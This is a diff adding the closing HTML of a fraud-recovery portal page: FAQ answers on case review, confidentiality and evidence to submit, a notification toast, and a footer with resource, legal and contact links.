+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+          </button>
+          <div class="faq-answer" id="faq-ans-1" role="region">
+            <p>Once submitted, your case report is instantly tokenized and audited by our lead fraud analysts. We aggregate the perpetrator's bank accounts, website hosts, and phone logs into a discovery package, and supply you with templates to initiate chargebacks and coordinate details with local cybercrime departments.</p>
+          </div>
+        </div>
+        
+        <div class="faq-item">
+          <button class="faq-question" aria-expanded="false" aria-controls="faq-ans-2">
+            <span>How long does the review process take?</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+          </button>
+          <div class="faq-answer" id="faq-ans-2" role="region">
+            <p>Our initial review phase takes 24 to 48 hours during business days. If active scam communication is ongoing (indicated by the 'Ongoing Case' toggle), our crisis analysts prioritize review to advise on mitigation tactics to prevent additional losses.</p>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question" aria-expanded="false" aria-controls="faq-ans-3">
+            <span>Is my information confidential?</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+          </button>
+          <div class="faq-answer" id="faq-ans-3" role="region">
+            <p>Absolutely. Under our GDPR compliance framework, all identity and financial data are stored within encrypted hardware modules. Your details will never be sold, nor will they be disclosed to third parties unless explicitly authorized by you during recovery steps (e.g., submitting evidence packs directly to your bank).</p>
+          </div>
+        </div>
+
+        <div class="faq-item">
+          <button class="faq-question" aria-expanded="false" aria-controls="faq-ans-4">
+            <span>What evidence should I provide?</span>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+          </button>
+          <div class="faq-answer" id="faq-ans-4" role="region">
+            <p>The most vital evidence includes: clear chat transcripts (WhatsApp, Telegram PDFs), full transaction confirmations showing transaction hashes (for crypto) or wire reference IDs, email headers (`.eml` formats), and contracts or agreements sent by the perpetrators.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Toast for Notifications -->
+  <div class="toast" id="toast-message-box" role="alert" aria-live="assertive">
+    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+    <div class="toast-message" id="toast-text">Progress saved locally.</div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <h3>Fraud Recovery Portal</h3>
+        <p>A global initiative dedicated to auditing financial scams, empowering victims, tracing cryptocurrency, and reclaiming losses with secure data protocols.</p>
+      </div>
+      <div class="footer-links-col">
+        <h4>Resources</h4>
+        <ul class="footer-links">
+          <li><a href="#how-it-works">How it Works</a></li>
+          <li><a href="#faq">FAQs</a></li>
+          <li><a href="#wizard">File a Report</a></li>
+        </ul>
+      </div>
+      <div class="footer-links-col">
+        <h4>Legal</h4>
+        <ul class="footer-links">
+          <li><a href="#privacy">Privacy Policy</a></li>
+          <li><a href="#terms">Terms of Service</a></li>
+          <li><a href="#gdpr">Data Protection Statement</a></li>
+        </ul>
+      </div>
+      <div class="footer-links-col">
+        <h4>Contact</h4>
+        <ul class="footer-links">
+          <li><a href="#support" id="contact-support-footer">Contact Support</a></li>
+          <li><span style="color: rgba(255,255,255,0.65); font-size: 0.9rem;">Emergency Hotline:<br><strong>1-800-SECURE-0</strong></span></li>
+        </ul>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <div>&copy; 2026 Fraud Recovery & Investigation Program (FRIP). All rights reserved.</div>
+      <div class="footer-bottom-links">
+        <a href="#privacy">Privacy Policy</a>
+        <a href="#terms">Terms</a>
+        <a href="#gdpr">GDPR / Data Protection</a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="app.js"></script>
+</body>
+</html>
